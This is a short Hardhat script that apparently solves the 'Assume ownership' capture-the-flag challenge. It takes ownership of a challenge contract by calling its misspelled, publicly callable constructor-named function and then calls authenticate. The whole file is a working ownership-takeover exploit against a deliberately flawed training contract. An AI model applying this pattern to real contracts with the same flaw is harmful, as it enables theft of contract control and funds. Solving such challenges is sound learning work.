import { ethers } from "hardhat";

const contractAddress = "0x8F3428c13403EEc09abf105f592b1A8D7183c2A2";

async function main() {
  const factory = await ethers.getContractFactory("AssumeOwnershipChallenge");
  const contract = factory.attach(contractAddress);

  let tx;
  tx = await contract.AssumeOwmershipChallenge();
  await tx.wait();

  tx = await contract.authenticate();
  await tx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
